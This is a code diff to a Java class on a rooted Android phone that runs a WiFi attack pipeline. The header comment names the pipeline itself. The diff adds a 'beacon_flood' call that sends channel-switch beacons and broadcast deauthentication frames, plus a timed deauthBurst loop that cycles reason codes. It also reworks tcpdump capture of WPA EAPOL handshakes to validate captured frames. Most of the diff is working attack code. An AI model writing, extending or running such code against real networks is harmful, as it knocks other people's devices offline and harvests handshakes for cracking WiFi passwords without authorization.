@@ -7,6 +7,9 @@ import java.util.Date;
 /**
  * Manages native WiFi monitor mode on Qualcomm adrastea (QCACLD-3.0).
  * Enables monitor mode via firmware reload, controls channels via iw.
+ * 
+ * Attack pipeline: beacon_flood (CSA+deauth) → passive EAPOL capture.
+ * NO WiFi toggling — stays in monitor mode the entire time.
  */
 public class MonitorManager {
     
@@ -18,17 +21,42 @@ public class MonitorManager {
     private static final String IFACE = "wlan0";
     private static final String IW_BIN = "/data/local/tmp/iw";
     private static final String IW_LIBS = "/data/local/tmp";
-    private static final String DEAUTH_BIN = "/data/local/tmp/deauth";
+    private static final String BEACON_FLOOD_BIN = "/data/local/tmp/beacon_flood";
     
     private boolean monitorEnabled = false;
     
     /**
-     * Send deauth frames to force clients to reconnect.
+     * Send CSA + deauth flood via beacon_flood.
+     * Stays in monitor mode — no WiFi toggle needed.
+     * Each call sends 10 deauth + 10 CSA beacons (~500ms).
      */
     public void deauth(String apMac, String clientMac, int channel) {
         if (!monitorEnabled) return;
-        execSuMagisk(DEAUTH_BIN + " " + IFACE + " " + apMac + " " + clientMac + " " + channel + " 2>/dev/null");
+        // beacon_flood <iface> <bssid> <ssid> <apFreq> <ourFreq> <reason>
+        // We target broadcast deauth (CSA forces clients to scan)
+        int reason = 7; // Class 3 frame from nonassociated STA
+        execSuMagisk(BEACON_FLOOD_BIN + " " + IFACE + " " + apMac
+                     + " \"x\" " + channel + " " + channel + " " + reason + " 2>/dev/null");
     }
+    
+    /**
+     * Deauth burst: rapid beacon_flood calls for durationSeconds.
+     * Call interval ~600ms = ~16 calls per 10s = 160 deauth + 160 CSA beacons.
+     */
+    public void deauthBurst(String apMac, int channel, int durationSeconds) {
+        if (!monitorEnabled) return;
+        long end = System.currentTimeMillis() + durationSeconds * 1000L;
+        final int[] REASONS = {1, 2, 3, 4, 6, 7};
+        int ri = 0;
+        while (System.currentTimeMillis() < end) {
+            int reason = REASONS[ri % REASONS.length];
+            execSuMagisk(BEACON_FLOOD_BIN + " " + IFACE + " " + apMac
+                         + " \"x\" " + channel + " " + channel + " " + reason + " 2>/dev/null");
+            ri++;
+            try { Thread.sleep(600); } catch (Exception e) {}
+        }
+    }
+    
     /**
      * Stage firmware files from vendor partition.
      */
@@ -103,7 +131,7 @@ public class MonitorManager {
      */
     public void setChannel(int channel) {
         String cmd = "LD_LIBRARY_PATH=" + IW_LIBS + " " + IW_BIN + " dev " + IFACE + " set channel " + channel;
-        execSu(cmd);
+        execSuMagisk(cmd);
         try { Thread.sleep(500); } catch (Exception e) {}
     }
     
@@ -123,30 +151,62 @@ public class MonitorManager {
         
         String cmd = "timeout " + durationSeconds + " tcpdump -i " + IFACE 
                      + " -l -n -e 2>/dev/null";
-        return execSuMagisk(cmd);
+        return execSuMagisk(cmd);  // MUST use magisk context for CAP_NET_RAW
     }
     
     /**
-     * Passive handshake capture via tcpdump (EAPOL filter).
-     * Returns path to pcap if handshake frames were captured, null otherwise.
+     * Passive EAPOL handshake capture via tcpdump.
+     * Captures ALL frames for target BSSID (wlan addr3 filter works on radiotap).
+     * Filters EAPOL in post-processing via countEapolFrames().
+     * Returns path to pcap if EAPOL frames were captured, null otherwise.
      */
     public String captureHandshake(String outputDir, String bssid, int durationSeconds) {
         if (!monitorEnabled) return null;
         
         String ts = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
         String path = outputDir + "/hs_" + bssid.replace(":", "") + "_" + ts + ".pcap";
-        String filter = "wlan addr3 " + bssid;
         
-        // Run tcpdump with timeout, capture up to 20 packets then exit
-        String cmd = "timeout 10 tcpdump -i " + IFACE + " -w " + path + " -c 20 " + filter + " 2>/dev/null";
-        execSu(cmd);
+        // wlan addr3 filter works correctly on radiotap — captures all 802.11 frames
+        // where addr3 (BSSID) matches the target AP. ether proto 0x888e is BROKEN
+        // on radiotap because BPF uses wrong offset.
+        String cmd = "timeout " + durationSeconds + " tcpdump -i " + IFACE 
+                     + " -w " + path + " wlan addr3 " + bssid + " 2>/dev/null";
+        execSuMagisk(cmd);
         
         java.io.File f = new java.io.File(path);
         if (f.exists() && f.length() > 68) {
-            System.out.println("[Monitor] Handshake: " + path + " (" + f.length() + " bytes)");
-            return path;
+            // Validate: check that we actually got EAPOL frames, not just headers
+            int eapolCount = countEapolFrames(path);
+            if (eapolCount > 0) {
+                System.out.println("[Monitor] Handshake: " + path + " (" + f.length() 
+                                   + " bytes, " + eapolCount + " EAPOL frames)");
+                return path;
+            } else {
+                // False positive — beacons or empty capture, discard
+                System.out.println("[Monitor] Discarding: " + path + " (no EAPOL, " 
+                                   + f.length() + " bytes)");
+                f.delete();
+                return null;
+            }
         }
+        // Too small or doesn't exist — cleanup
+        if (f.exists() && f.length() <= 68) f.delete();
         return null;
+    }
+    
+    /**
+     * Count EAPOL frames in a pcap file.
+     * Uses tcpdump to read back and grep for EAPOL indicator.
+     */
+    private int countEapolFrames(String pcapPath) {
+        try {
+            String output = execSuMagisk("tcpdump -r " + pcapPath + " -n 2>/dev/null | grep -ci EAPOL");
+            output = output.trim();
+            if (!output.isEmpty()) {
+                return Integer.parseInt(output.split("\\n")[0]);
+            }
+        } catch (Exception e) {}
+        return 0;
     }
     
     /**
@@ -157,7 +217,7 @@ public class MonitorManager {
     }
     
     /**
-     * Execute with magisk context (has CAP_NET_RAW for tcpdump).
+     * Execute with magisk context (has CAP_NET_RAW for tcpdump + raw frame injection).
      */
     private String execSuMagisk(String cmd) {
         return exec(new String[]{"su", "-Z", "u:r:magisk:s0", "-c", cmd + " 2>&1; exit"});
